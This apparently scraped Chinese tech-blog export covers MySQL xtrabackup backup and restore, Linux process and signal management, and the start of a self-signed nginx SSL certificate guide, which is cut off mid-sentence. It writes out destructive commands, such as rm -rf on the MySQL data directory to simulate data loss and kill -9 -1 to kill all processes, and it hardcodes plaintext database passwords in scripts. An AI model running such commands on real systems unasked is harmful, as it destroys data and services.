必须先准备好备份，然后才能还原它。 为方便起见，xtrabackup二进制文件具有将--copy-back 备份复制到服务器的数据目录的选项： 1xtrabackup --datadir=/usr/local/mysql/data --copy-back --target-dir =/data/backup/mysql/ 如果您不想保存备份，则可以使用 --move-back将备份数据移动到datadir的选项。 如果不想使用以上任何选项，则可以另外使用 rsync或cp来还原文件。 注意 恢复备份之前，datadir必须为空。同样重要的是要注意，在执行还原之前需要关闭MySQL服务器。您不能还原到正在运行的mysqld实例的数据目录（导入部分备份时除外）。 可用于还原备份的rsync命令示例如下所示： 123456 rsync -avrP /data/backup/mysql/ /usr/local/mysql/data/或者\\cp -a /data/backup/mysql/* /usr/local/mysql/data/在cp指令前面加反斜杠可以不弹出是否覆盖的询问而直接覆盖！ 您应该检查恢复的文件是否具有正确的所有权和权限。 由于将保留文件的属性，因此在大多数情况下，mysql在启动数据库服务器之前，您需要将文件的所有权更改为，因为它们将由创建备份的用户拥有： 1chown -R mysql:mysql /usr/local/mysql/data/ 现在，数据已还原，您可以启动服务器。 1systemctl start mysqld 增量备份要进行增量备份，请像往常一样从完整备份开始。该 xtrabackup二进制写入一个名为xtrabackup_checkpoints到备份的目标目录。该文件包含一行，显示 to_lsn，这是备份结束时数据库的LSN。 使用以下命令创建完整备份： 12xtrabackup --backup --target-dir=/data/backup/mysql/ -u root -P 3306 -p'123.Shui!!' 查看xtrabackup_checkpoints文件 1234567cat /data/backup/mysql/xtrabackup_checkpoints backup_type = full-backuped 类型是全备from_lsn = 0 本次备份开始点to_lsn = 18566199 本次备份结束点last_lsn = 18566209 下次备份开始点flushed_lsn = 0 第一次增量备份 12345增量备份时两个参数的说明：--target-dir 指定增备目录（需要备份到哪儿）--incremental-basedir 指定上一次备份目录（第一次增量备份时，该参数=全备目录；第二次增量备份时，该参数=第一次增量备份目录） 现在您已拥有完整备份，您可以基于它进行增量备份。使用以下命令：(先模拟新插入数据) 123xtrabackup --backup --target-dir=/data/backup/mysqlinc/inc1 --incremental-basedir=/data/backup/mysql/ -uroot -p'123.Shui!!'新指定的目录不存在，会自动创建。 查看新的xtrabackup_checkpoints文件 1234567cat /data/backup/mysqlinc/inc1/xtrabackup_checkpoints backup_type = incremental 备份类型是增量备份from_lsn = 18566199 上次备份的结束位置to_lsn = 18567314 本次备份结束的位置last_lsn = 18569708 最后的位置flushed_lsn = 0 from_lsn是备份的开始LSN，对于增量备份，它必须to_lsn与先前/基本备份的相同（如果是最后一个检查点）。 第二次增量备份 现在可以使用此目录作为另一个增量备份的基础： 12xtrabackup --backup --target-dir=/data/backup/mysqlinc/inc2 \\--incremental-basedir=/data/backup/mysqlinc/inc1 -uroot -p'123.Shui!!' 此文件夹还包含xtrabackup_checkpoints：查看信息 1234567 cat /data/backup/mysqlinc/inc2/xtrabackup_checkpoints backup_type = incrementalfrom_lsn = 18567314 来自上次备份的结束位置。to_lsn = 18570792last_lsn = 18573267flushed_lsn = 0 全量恢复（全备+增备） 模拟数据丢失环境 12systemctl stop mysqldrm /usr/local/mysql/data/* -rf 恢复前准备（初始化备份目录） 增量备份的步骤与完全备份的步骤不同。在完全备份中，执行两种类型的操作以使数据库保持一致：已提交的事务相对于数据文件从日志文件中重放，未提交的事务被回滚。准备增量备份时，必须跳过未提交事务的回滚，因为在备份时未提交的事务可能正在进行中，并且很有可能将在下一次增量备份中提交。您应该使用该 --apply-log-only选项来防止回滚阶段。 警告 如果不使用该 选项阻止回滚阶段，则增量备份将无用。事务回滚后，不能再应用增量备份。--apply-log-only 从创建的完整备份开始，您可以准备它，然后将增量差异应用于它。回想一下，您有以下备份： 123/data/backup/mysql/data/backup/mysqlinc/inc1/data/backup/mysqlinc/inc2 要准备基本备份，您需要--prepare照常运行，但要防止回滚阶段： 1xtrabackup --prepare --apply-log-only --target-dir=/data/backup/mysql 输出应以类似于以下内容的文本结尾： 123Shutdown completed; log sequence number 18566229Number of pools: 1200721 14:10:03 completed OK! 日志序列号应与to_lsn您先前看到的基本备份的序列号匹配。 要将第一个增量备份应用于完整备份，请运行以下命令： 1xtrabackup --prepare --apply-log-only --target-dir=/data/backup/mysql --incremental-dir=/data/backup/mysqlinc/inc1 Percona XtraBackup不支持使用相同的增量备份目录来准备备份的两个副本。不要--prepare使用相同的增量备份目录（–incremental-dir的值）运行超过一次。 准备第二个增量备份是一个类似的过程：将增量应用到（已修改的）基础备份，您将及时将其数据前滚到第二个增量备份的点： 12xtrabackup --prepare --target-dir=/data/backup/mysql \\--incremental-dir=/data/backup/mysqlinc/inc2 注意 --apply-log-only合并除最后一个以外的所有增量时应使用。这就是为什么上一行不包含该 --apply-log-only选项的原因。即使--apply-log-only在最后一步中使用了，备份仍将保持一致，但在这种情况下，服务器将执行回滚阶段。 一旦准备好增量备份就与完整备份相同，可以用相同的方式还原它们。 拷贝全备目录下所有内容到数据目录中（此时的全备目录已经拥有全量数据） 用于还原备份的rsync命令示例如下所示： 123456 rsync -avrP /data/backup/mysql/ /usr/local/mysql/data/或者\\cp -a /data/backup/mysql/* /usr/local/mysql/data/在cp指令前面加反斜杠可以不弹出是否覆盖的询问而直接覆盖！ 授权 1chown -R mysql:mysql /usr/local/mysql/data/ 现在，数据已还原，可以启动服务器查看。 1systemctl start mysqld 增量恢复完成 公司备份实战 1234创建备份目录mkdir /mysqlbackup/{wanquan,zengliang} -pxtrabackup --backup --target-dir=/mysqlbackup/wanquan/$(date &quot;+%Y-%m-%d&quot;) -u root -P 3306 -H 192.168.224.11 -p'123.Shui!!' 现在可以使用此目录作为另一个增量备份的基础： 1xtrabackup --backup --target-dir=/mysqlbackup/zengliang/$(date &quot;+%Y-%m-%d&quot;) --incremental-basedir=/mysqlbackup/wanquan/`ls /mysqlbackup/wanquan/` -uroot -H 192.168.224.11 -p'123.Shui!!' 第二次增量备份 1xtrabackup --backup --target-dir=/mysqlbackup/zengliang/$(date &quot;+%Y-%m-%d&quot;) --incremental-basedir=/mysqlbackup/zengliang/$(date &quot;+%Y-%m-%d&quot;) -uroot -H 192.168.224.11 -p'123.Shui!!' 备份脚本 vim mysqlbackup.sh 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/bin/bashyum -y install wget lrzsz &gt;&gt;/dev/null#今天Date_today=$(date &quot;+%w&quot;)#昨天Yester_day=$(date &quot;+%w&quot; -d '1 day ago')#七天前Sevendays_ago=$(date &quot;+%w&quot; -d '7 day ago')#今天星期几week=`date +%w`mysqluser=&quot;root&quot;mysqlpass=&quot;123.Shui!!&quot;mysqlcon=/etc/my.cnfhost=&quot;192.168.224.11&quot;first=`date &quot;+%Y-%m-%d&quot;`if [ $first = 2020-07-21 ];then yum install https://repo.percona.com/yum/percona-release-latest.noarch.rpm 2&amp;&gt;/dev/null percona-release enable-only tools release yum install -y percona-xtrabackup-80 qpress 1&gt; /dev/null mkdir -p /mysqlbackup/{wanquan,zengliang}fi#判断今天是不是周日 如果是周日进行全量备份if [ $week -eq 0 ];then rm -rf /mysqlbackup/wanquan/$Sevendays_ago &gt;&gt;/dev/null xtrabackup --backup --default-file=${mysqlcon} --target-dir=/mysqlbackup/wanquan/$Date_today --user=${mysqluser} --host=${host} --password=${mysqlpass} 1&gt;/dev/null if [ $? -eq 0 ];then rm -rf /mysqlbackup/zengliang/* fielse dir=`ls /mysqlbackup/zengliang/ | wc -l | awk '{print $1}'`#判断是否有目录，没有就进行第一次增量备份。 if [ $dir -eq 0 ];then xtrabackup --backup --default-file=${mysqlcon} --target-dir=/mysqlbackup/zengliang/$Date_today --incremental-basedir=/mysqlbackup/wanquan/`ls /mysqlbackup/wanquan/` --user=${mysqluser} --host=${host} --password=${mysqlpass} 1&gt;/dev/null else xtrabackup --backup --default-file=${mysqlcon} --target-dir=/mysqlbackup/zengliang/$Date_today --incremental-basedir=/mysqlbackup/zengliang/${Yester_day} --user=${mysqluser} --host=${host} --password=${mysqlpass} 1&gt;/dev/null fifi 先修改/etc/my.cnf 文件，打开log-bin=mysql-bin ​ server-id=1 开始访问定时任务每天早上8点进行备份 12345crontab -e 00 8 * * * /usr/bin/sh /root/mysqlbackup.sh#每天8点钟执行这个脚本做备份 模拟周二数据删除后恢复 123systemctl stop mysqldrm /usr/local/mysql/data/* -rf 恢复前准备（初始化备份目录） 初始化全备 1xtrabackup --prepare --apply-log-only --target-dir=/mysqlbackup/wanquan/0/ 初始化周一的增量备份 1xtrabackup --prepare --apply-log-only --target-dir=/mysqlbackup/wanquan/0/ --incremental-dir=/mysqlbackup/zengliang/1 初始化周二的增量备份 1xtrabackup --prepare --target-dir=/mysqlbackup/wanquan/0/ --incremental-dir=/mysqlbackup/zengliang/2 拷贝全备目录下所有内容到数据目录中（此时的全备目录已经拥有全量数据） 1cp -a /mysqlbackup/wanquan/0/* /usr/local/mysql/data/ 授权 1chown -R mysql:mysql /usr/local/mysql/data/ 启动 1systemctl start mysqld 此时数据已经恢复成功。 2.innobackupex 常用参数(2.4版本)mysql不能高于5.7版本。 123456789101112131415161718192021222324252627282930313233--apply-log 恢复时，通过xtrabackup_logfile在备份目录中创建一个备份（恢复备份时必选）--copy-back 从备份目录中以拷贝的形式恢复到数据目录中 --move-back 从备份目录中以移动的形式恢复到数据目录中 --defaults-file 指定mysql主配置文件路径 --remote-host 使用ssh将备份文件拷贝至远程服务器上 --stream 备份时启用打包 --compress 备份时启用压缩 --tables 指定要备份的表--databases 指定要备份的库 --uncompress 解压以压缩方式备份的备份文件 --incremental 创建一个增量备份，在增量备份时使用 --incremental-basedir 增量备份时，指定全量备份的路径，以确定全量备份的终止位置 --incremental-dir 将增量备份与全量备份合并后放入新的目录--incremental-lsn 增量备份时，指定增量备份的起点 --no-lock 备份时，关闭自动锁表功能 --safe-slave-backup 备份时，先停止slave进程--no-timestamp 备份时，不自动创建以日期和时间的目录 使用案例： 备份最好不要用root用户，需要新建用户 123create user 'backup_mysql'@'%' identified with mysql_native_password by '123.Shui!!@#'; grant select,process,reload,super on *.* to 'backup_mysql'@'%' ; 开始备份 1mkdir /mysqlbackup/{wanquan,zengliang} -p 1innobackupex --defaults-file=/etc/my.cnf --user=backup_mysql --password=123.Shui!!@# /mysqlbackup/wanquan/$(date &quot;+%Y-%m-%d&quot;) --no-timestamp $(date “+%Y-%m-%d”) #表示已今天日期命名 这样备份会多创建一个目录，所以需要加一个参数 –no-timestamp 告诉innobackupex不要创建一个时间戳目录来存储备份 停止数据库 测试，删除一个表或库，模拟误操作或者直接删除数据库数据目录 1rm /usr/local/mysql/data/* -rf 恢复前准备（初始化数据） 1innobackupex --defaults-file=/etc/my.cnf --apply-log /mysqlbackup/wanquan/$(ls /mysqlbackup/wanquan/) 恢复数据到数据目录中；–datadir 指定数据目录位置，如果配置文件中有指定，则不需要在此指定 1innobackupex --defaults-file=/etc/my.cnf --copy-back --datadir=/usr/local/mysql/data /mysqlbackup/wanquan/$(ls /mysqlbackup/wanquan/) 给目录授权 1chown -R mysql.mysql /usr/local/mysql/data/ 启动数据库 1systemctl start mysqld 全备及全备恢复完成！ innobackupex 增量备份 已经初始化的全备目录的数据不能再做为增量备份的基础数据，下面需要增量备份，所以这里需要重新备份， 全备 1innobackupex --defaults-file=/etc/my.cnf --user=backup_mysql --password=123.Shui!!@# /mysqlbackup/wanquan/$(date &quot;+%Y-%m-%d&quot;) --no-timestamp 新增数据 1mysql -p -e 'create database b; use b;create table b1 (id int);show tables;' 第一次增量备份 1innobackupex --incremental /mysqlbackup/zengliang/$(date &quot;+%Y-%m-%d&quot;) --incremental-basedir=/mysqlbackup/wanquan/`ls /mysqlbackup/wanquan/` --user=backup_mysql --password=123.Shui!!@# --no-timestamp –incremental-basedir 指定全量备份目录，因为增量备份需要知道前一次全量是到哪里结束的 –incremental 指定增量备份的目录，会在指定目录下创建一个以当前日期和时间命名的 再次新增数据 12创建C 库mysql -p -e 'create database c; use c;create table c1 (id int);show tables;' 第二次增量备份 目录日期不一样，还有–incremental=basedir= 指定的目录是第一次增量备份的目录 1innobackupex --incremental /mysqlbackup/zengliang/$(date &quot;+%Y-%m-%d-%H&quot;) --incremental-basedir=/mysqlbackup/zengliang/`ls /mysqlbackup/zengliang/` --user=backup_mysql --password=123.Shui!!@# --no-timestamp 增量备份完成！ 增量备份恢复 12systemctl stop mysqld rm /usr/local/mysql/data/* -rf 初始化全备目录 1innobackupex --apply-log --redo-only /mysqlbackup/wanquan/`ls /mysqlbackup/wanquan/` 查看有多少增量备份目录 ls /mysqlbackup/zengliang/ 初始化第一次增备目录 1innobackupex --apply-log --redo-only /mysqlbackup/wanquan/`ls /mysqlbackup/wanquan/` --incremental-dir=/mysqlbackup/zengliang/2019-10-16 把增量备份的数据整合到全备了 初始化第二次增备目录（注意：这一步不需要加 –redo-only 选项）最后一次不需要加 1innobackupex --apply-log /mysqlbackup/wanquan/`ls /mysqlbackup/wanquan/` --incremental-dir=/mysqlbackup/zengliang/2019-10-17-23 开始完整恢复 1innobackupex --copy-back /mysqlbackup/wanquan/`ls /mysqlbackup/wanquan/` 过程：先将两次增量备份所备份的数据整合到全备目录中，然后进行一次性恢复 重新授权 1chown -R mysql.mysql /usr/local/mysql/data/ 启动数据库 1systemctl start mysqld 至此，innobackupex 增量备份与恢复完成！","link":"/2020/08/03/mysql%E5%A4%87%E4%BB%BD/"},{"title":"linux进程管理","text":"进程管理进程 - 正在运行的程序PID 进程唯一标识符 (是16位正整数 0-65535)(2^15 = 65535 无符号的短整型 short int) PPID 父进程的PID 软件 -&gt; 至少有一个程序 -&gt; 至少有一个进程 -&gt; 至少有一个线程ELF可执行文件主要分段(PPP1): readelf -h /bin/cp 查看可执行文件的elf头 readelf -l /bin/cp 查看可执行文件的elf头详细信息 BSS 存储未初始化全局变量 DATA 存储初始化的全局变量 RODATA 存储常量 TEXT 存储指令集 程序运行的过程： 建立虚拟空间（分配一个页目录）-&gt; 建立虚拟空间与可执行文件映射（页目录项指向磁盘的程序） -&gt; 跳到程序入口 -&gt; 缺页异常-&gt; 在内存中寻找空闲页，将对应的页换入 -&gt; 建立映射 -&gt; 开始执行。 进程独立虚拟内存空间, 实现进程间隔离 进程之间通讯(内核提供) IPC 信号 异常通知 管道 数据通信(基于I/O) 套接字 数据通信(多应用于网络 协议) 消息队列 数据通信(队列) 共享内存 数据通信(将虚拟地址映射同一块物理地址) 信号量(信号灯) 并发处理 进程和线程 进程独立内存空间, 会产生进程间通讯 线程独立栈空间, 依赖进程空间 进程列表命令top 文本任务管理器 ? 帮助 q 退出 k(小写) 结束进程 然后输入对应的进程pid号就可以结束对应的进程了。 空格 实时刷新 S 时间on 或off z, y 切换高亮显示，z排序字段默认CPU y运行任务。 z，b。 切换：“ z”颜色/单色； 'b'粗体/反向（仅当'x'或'y'时） d或者s 设置实时更新时间间隔，默认3秒。 W 写入配置文件。就是保存当前的设置。 Y 检查其他输出。 截取两帧数据到top.txt文件中(PPP2) top -d 0.5 -b -n 2 &gt; /tmp/top.txt 第一行：系统运行时间和平均负载 当前时间、系统已运行时间、当前登录用户的数量、最近5、10、15分钟内的平均负载 第二行：任务 任务的总数、运行中(running)的任务、休眠(sleeping)中的任务、停止(stopped)的任务、僵尸状态(zombie)的任务 第三行：cpu状态 字段 字段释义 us user： 运行(未调整优先级的) 用户进程的CPU时间 sy system: 运行内核进程的CPU时间 ni niced：运行已调整优先级的用户进程的CPU时间 id idle:空闲时间 wa IO wait: 用于等待IO完成的CPU时间 hi 处理硬件中断的CPU时间 si 处理软件中断的CPU时间 st 这个虚拟机被hypervisor偷去的CPU时间（译注：如果当前处于一个hypervisor下的vm，实际上hypervisor也是要消耗一部分CPU处理时间的） 第四行：内存 全部可用内存(total)、空闲内存(free)、已使用内存(used) 、缓冲内存(buff/cache) 第五行：swap 全部、已使用、空闲和缓冲交换空间 第七行至N行：各进程任务的的状态监控 字段 释义 PID 进程ID，进程的唯一标识符 USER 进程所有者的实际用户名 PR 进程的调度优先级。这个字段的一些值是’rt’。这意味这这些进程运行在实时态。 NI 进程的nice值（优先级）。越小的值意味着越高的优先级。负值表示高优先级，正值表示低优先级 VIRT virtual memory usage 虚拟内存,进程使用的虚拟内存。进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES1、进程“需要的”虚拟内存大小，包括进程使用的库、代码、数据等 2、假如进程申请100m的内存，但实际只使用了10m，那么它会增长100m，而不是实际的使用量 RES **resident memory usage 常驻内存,**驻留内存大小。驻留内存是任务使用的非交换物理内存大小。进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA1、进程当前使用的内存大小，但不包括swap out 2、包含其他进程的共享 3、如果申请100m的内存，实际使用10m，它只增长10m，与VIRT相反 4、关于库占用内存的情况，它只统计加载的库文件所占内存大小 SHR SHR：shared memory 共享内存1、除了自身进程的共享内存，也包括其他进程的共享内存 2、虽然进程只使用了几个共享库的函数，但它包含了整个共享库的大小 3、计算某个进程所占的物理内存大小公式：RES – SHR 4、swap out后，它将会降下来 S 这个是进程的状态。它有以下不同的值:D - 不可中断的睡眠态。R – 运行态S – 睡眠态T – 被跟踪或已停止Z – 僵尸态 %CPU 自从上一次更新时到现在任务所使用的CPU时间百分比。%CPU显示的是进程占用一个核的百分比，而不是整个cpu（N核）的百分比，有时候可能大于100，那是因为该进程启用了多线程占用了多个核心，所以有时候我们看该值得时候会超过100%，但不会超过总核数*100 %MEM 进程使用的可用物理内存百分比 TIME+ 任务启动后到现在所使用的全部CPU时间，精确到百分之一秒 COMMAND 运行进程所使用的命令。进程名称（命令名/命令行） 交互命令 Z:改变颜色； S 设置摘要数据颜色(就是最上面的信息颜色)。 M 设置消息提示的颜色 H 设置头部一行的颜色 T 设置主体的颜色 “ a”或“ w”来提交和更改另一个，切换颜色搭配的模板。 B：加粗 E/e 设置界面 B设置头部信息粗体显示(默认粗体) E/e(设置后缀信息m/g/t/p)默认是不带任何后缀。 t:显示和隐藏任务/cpu信息；m:内存信息 1：监控每个逻辑CPU的状况； f/F f” /“ F”添加/删除/排序/排序 进入排序界面，前面有*表示会在界面显示的信息，按d或者空格可以切换显示信息或不显示。 按-&gt;左键可以选中然后可以修改显示的顺序，然后敲回车就可以了。s是设置排序，默认是按照cpu排序的。 R:正常排序/反向排序； s：设置刷新的时间——–常用 i：忽略闲置和僵死进程。这是一个开关式命令。 r:重新安排一个进程的优先级别。系统提示用户输入需要改变的进程PID以及需要设置的进程优先级值。输入一个正值将使优先级降低，反之则可以使该进程拥有更高的优先权。默认值是10。 c:切换显示命令名称和完整命令行。 M:根据驻留内存大小进行排序。————-常用 P:根据CPU使用百分比大小进行排序。———–常用 H:显示线程 l，t，m: 切换摘要：’l’加载平均值； “ t”任务/ CPU统计信息； ‘m’内存信息，切换信息显示方式 L : 查找相关应用信息。搜索 u/U：输入用户，显示用户的任务 如: nginx 会查出nginx相关进程。 ps 列表进程(PPP3) ps 列出当前终端运行的程序 ps -aux 列出所有进程信息(BSD) ps -ef 列出所有进程信息 ps -e -o pid,comm,ppid 自定义显示字段 ... ps -aux和ps -ef的区别 1. -ef是System V展示风格，而aux是BSD风格。 ps -aux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.1 193832 6904 ? Ss 9月28 0:12 /usr/lib/systemd/systemd --switched-root --system--deserialize 22 字段含义： USER： 用户名称 PID： 进程号 %CPU： 进程占用CPU的百分比 %MEM： 进程占用物理内存的百分比 VSZ： 进程占用的虚拟内存大小（单位：KB） RSS： 进程占用的物理内存大小（单位：KB） TTY： 终端名称（缩写），若为？，则代表此进程与终端无关，因为它们是由系统启动的 STAT： 进程状态 START： 进程的启动时间 TIME： CPU时间，即进程使用CPU的总时间 COMMAND： 启动进程所用的命令和参数，如果过长会被截断显示 ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 9月28 ? 00:00:12 /usr/lib/systemd/systemd --switched-root --system --deserialize 22 字段含义： UID： 用户ID PID： 进程ID PPID： 父进程ID C： CPU用于计算执行优先级的因子。数值越大，表明进程是CPU密集型运算，执行优先级会降低；数值越小，表明进程是I/O密集型运算，执行优先级会提高 STIME： 进程启动的时间 TTY： 完整的终端名称 TIME： CPU时间 CMD： 完整的启动进程所用的命令和参数 2. COMMADN列如果过长，aux会截断显示，而ef不会 总结： 如果想查看进程的CPU占用率和内存占用率，可以使用aux 如果想查看进程的父进程ID和完整的COMMAND命令，可以使用ef pstree 打印进程树 pstree -p 带PID的进程树 pgrep 按进程名查找进程 pgrep vim pgrep -u root 进程控制(信号机制的发信号)信号源 kill -l 列出全部信号名称 说明： 只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。 下面是常用的信号： HUP 1 终端断线 INT 2 中断（同 Ctrl + C） QUIT 3 退出（同 Ctrl + \\） TERM 15 终止 KILL 9 强制终止 CONT 18 继续（与STOP相反， fg/bg命令） STOP 19 暂停（同 Ctrl + Z） 终止操作 kill -15 PID 杀死进程 kill -9 PID 终止和杀死的区别 当进程在进行一个关键性操作的时候， 15不能立即杀死他， 需要这个进程先处理玩自己的事情才能杀掉 而这个时候还是想杀死这个进程的话， 就可以使用9号信号， 9号信号是必杀信号 捕捉信号 trap 操作 信号源 9和19不能捕捉 通过进程名杀死进程 杀死进程名带有关键词的进程 pkill -9 关键词 杀死对应进程名的进程 pkill -9 -x 进程名 杀死对应root用户的所有进程 pkill -u root Linux Shell脚本实现根据进程名杀死进程 ps -ef |grep check-domain.sh |grep -v grep |awk '{print $2}' | xargs kill -9 进程状态在unix/linux中，正常情况下，子进程是通过父进程创建的，子进程再创建新的进程。 子进程的结束和父进程的运行是一个异步过程,即父进程永远无法预测子进程到底什么时候结束。 当一个进程完成它的工作终止之后，它的父进程需要调用wait()或者waitpid()系统调用取得子进程的终止状态。 R 运行状态 S 睡眠状态 D 不可中断睡眠状态 Z 僵尸进程 孤儿进程 一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。 僵尸进程 一个进程使用fork创建子进程，如果子进程退出工作状态，而父进程并没有调用wait()或waitpid()获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。 进程的正常结束： 子进程要给父进程返回进程状态 问题及危害： linux提供了一种机制可以保证只要父进程想知道子进程结束时的状态信息，就可以得到。 这种机制就是: 在每个进程退出的时候,内核释放该进程所有的资源,包括打开的文件,占用的内存等。 但是仍然为其保留一定的信息(PID, 运行时间， 退出状态等)， 直到父进程通过wait / waitpid来取时才释放。 这样就导致了问题： 如果父进程不调用wait / waitpid的话，那么保留的那段信息就不会释放，其进程号就会一直被占用， 但是系统所能使用的进程号是有限的，如果大量的产生僵死进程，将因为没有可用的进程号而导致系统不能产生新的进程. 此即为僵尸进程的危害，应当避免。 孤儿进程是没有父进程的进程，收集孤儿进程的退出信息的这个重任就落到了init进程身上， init进程就好像是一个民政局，专门负责处理孤儿进程的善后工作。每当出现一个孤儿进程的时候， 内核就把孤儿进程的父进程设置为init，而init进程会循环地wait()它的已经退出的子进程。 这样，当一个孤儿进程凄凉地结束了其生命周期的时候，init进程就会出面处理它的一切善后工作。 因此孤儿进程并不会有什么危害。 任何一个子进程(init除外)在exit()之后，并非马上就消失掉，而是留下一个称为僵尸进程(Zombie)的数据结构，等待父进程处理。 这是每个子进程在结束时都要经过的阶段。如果子进程在exit()之后，父进程没有来得及处理， 这时用ps命令就能看到子进程的状态是“Z”。如果父进程能及时处理，可能用ps命令就来不及看到子进程的僵尸状态，但这并不等于子进程不经过僵尸状态。 如果父进程在子进程结束之前退出，则子进程将由init接管。init将会以父进程的身份对僵尸状态的子进程进行处理。 杀死僵尸进程， 只需要将僵尸进程父进程干掉就可以了, 僵尸进程这个时候就被init(1号进程)接管， 成为这个子进程的父进程，这个僵尸进程就变成了孤儿进程。 查看是否有僵尸进程的简略方法： ps -aux | grep Z ps -A -o stat,ppid,pid,cmd | grep -e '^[Zz]' 进程优先级(NI)进程优先级范围: -20 到 19, 数值越小, 优先级越高 普通用户只能将进程优先级数值调大， 不能调小 查看进程优先级: ps -el / top / ps -eo pid,ni,comm nice 指定运行程序的进程优先级(PPP5) nince -n 19 tar -xf mysql.tar.bz2 renice 更改正在运行程序的进程优先级(PPP6) sudo renice -19 PID 占用cpu一个核心: nice -n 0 cat /dev/urandom &gt; /dev/null 查看进程优先级设置的变化: time nice -n -20 head -c 1m /dev/urandom &gt; /dev/null 进程组进程组包含一个或多个进程, 用于进程分组, 方便管理进程 每个进程都会所属一个进程组, 默认与父进程同属一个组 进程组也有唯一标识符(pgrp), 进程组组长PID即是进程组ID 创建进程组的人即是进程组组长, 进程组组长不能再创建进程组 由于进程组ID与进程组组长的PID一致，操作组长进程直接操作PID即可, 操作进程组在PID前面加负(-)号 给进程组长发信号: kill -9 1023 给进程组发信号: kill -9 -1023 给本进程组发信号: kill -9 0 给所有进程发信号: kill -9 -1 会话 一个会话包含一个进程组或多个进程组 一个会话对应一个控制终端(输入输出) 一个会话包含进程组分为前台进程组和后台进程组 使用控制终端的进程组即是前台进程组， 其它全为后台进程组 会话与进程组一样，都唯一标识符， 也有管理者(会长) 进程组组长不能创建会话 作业管理 一个程序正在运行的时候， 可以把这个程序放到后台去运行，不占前台的资源 ps 查看当前会话所有进程组 jobs 查看当前会话的所有后台进程组(任务) jobs -l 列出后台进程组带PID显示 jobs -s 只列出暂停的jobs jobs -r 只列出运行的jobs ctrl + z 将前台进程组切换到后台停止, 在终端运行无效果 ctrl + c 再终端运行的话会把当前终端运行的任务停止 ctrl + d 在终端运行的时候会关闭当前终端 gedit &amp; 将gedit进程切换到后台 fg 将后台进程组切换到前台运行(默认将最后的后台进程组调到前台) fg 2 将ID为2的后台进程组调到前台运行 bg 将后台进程组停止状态改为运行状态 bg 2 将jobs列表ID对应2的后台进程组停止状态改为运行状态 vncview &amp; 在后台运行vnc，不会占前台终端的资源 后台复制大文件 生成指定大小的文件 head -c 500M /dev/zero &gt; swapfile dd if=/dev/zero of=./swapfile bs=100M count=5 cp /soft/* /test/ -rf 如果你要做一个大文件的拷贝，不加后台符号这个终端就只能等它拷完才能用 但这里还考虑一个问题，如果它还没有拷完，而我不小心把这个终端关了, 那么这个程序也会停止，造成没拷完的情况 所以把要做的事锁定到后台，在前面加一个nohup命令就可以了, 在后面加一个&amp;号也是可以的 nohup 命令nohup cp /soft/* /test/ -rf &amp;把复制的终端关闭，再开一个终端查看，用jobs -l也是看不到这个job (因为换了终端)，但是拷贝仍在继续)cp /soft/* /test/ -rf &amp;所以可以加一个后台符号让它在后台拷就行 &amp;是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出 &amp;的意思是在后台运行， ./a.out &amp; 的时候， 即使你用ctrl C, 那么a.out照样运行（因为对SIGINT信号免疫）。 但是要注意， 如果你直接关掉shell后， 那么， a.out进程同样消失。 可见， &amp;的后台并不硬（因为对SIGHUP信号不免疫）。 nohup的意思是忽略SIGHUP信号， 所以当运行nohup ./a.out的时候， 关闭shell, 那么a.out进程还是存在的（对SIGHUP信号免疫）。但是如果你直接在shell中用Ctrl C, 那么, a.out进程也是会消失的（因为对SIGINT信号不免疫） 那么，我们可以巧妙的吧他们结合起来用就是 1nohup COMMAND &amp; 这样就能使命令永久的在后台执行","link":"/2020/08/03/linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"title":"nginx本地ssl证书制作","text":"1.nginx本地ssl证书制作制作ca证书 1.生成 ca.key CA 私钥 1openssl genrsa -out ca.key 2048 2.生成证书请求文件 生成签名请求： 生成签署申请（注意除Common Name以外可以为空，Common Name必须为服务器的ip或域名）如www.yichen1.com即可生成该站点的证书，同时也可以使用泛域名如 *.yichen1.com 来生成所有二级域名可用的网站证书。 123456789101112131415161718192021openssl req -new -key ca.key -out ca.csr需要依次输入Country Name(国家名) CNState or Province Name(州名或省名) sichuanLocality Name(地区或城市名称) dazhouOrganization Name(机构名称) yichen.LtdOrganizational Unit Name(组织单位名称) yichen.LtdCommon Name(域名或IP) yichen1.comEmail Address(邮箱地址) yichen1@163.comPlease enter the following 'extra' attributesto be sent with your certificate request(请输入以下“额外”属性与您的证书请求一起发送)A challenge password(访问密码,必须4位以上。) 1234An optional company name(公司名称): baidu这时候就会生成yichen1.csr这个文件。这时候本地有两个文件 ca.csr ca.key 常用参数 -key 私钥文件（指明从哪个私钥文件中提取公钥创建证书签署请求） -out 指定证书文件存放在位置 -new 生成新的证书签署请求； -days n 证书有效时长，单位为“天”； -x509 生成自签证书 3.用自己的私钥给自己签发根证书 123456openssl x509 -req -days 7304 -in ca.csr -signkey ca.key -out ca.crt这时候会生成ca.crt 文件现在有san个文件了。3. ca.crt 2. ca.csr 1. ca.key 4.创建 /etc/pki/CA/index.txt文件 用来跟踪已经颁发的证书。 1touch /etc/pki/CA/index.txt 用CA 进行签名： 1openssl ca -policy policy_anything -days 3652 -cert ca.crt -keyfile ca.key -in ca.csr -out yichen1.crt 如果报错 用来跟踪最后一次颁发的证书的序列号。 1echo &quot;01&quot; &gt; /etc/pki/CA/serial 解决方案： 修改 /etc/pki/tls/openssl.cnf 文件 123456789101112131415# A few difference way of specifying how similar the request should look# For type CA, the listed attributes must be the same, and the optional# and supplied fields are just that :-)policy = policy_match# For the CA policy[ policy_match ]countryName = match#stateOrProvinceName = match (将 match 改为 optional )#organizationName = match (将 match 改为 optional )stateOrProvinceName = optionalorganizationName = optional organizationalUnitName = optionalcommonName = suppliedemailAddress = optional 再次执行： 1234567openssl ca -policy policy_anything -days 3652 -cert ca.crt -keyfile ca.key -in yichen1.csr -out yichen1.crt生成新的文件yichen1.crt有4个文件了。为了方便。把ca.key重命名下ca.crt ca.csr ca.key yichen2.crtmv ca.key yichen1.key Nginx 配置 以下是 Nginx 启用的部分配置，需要设置 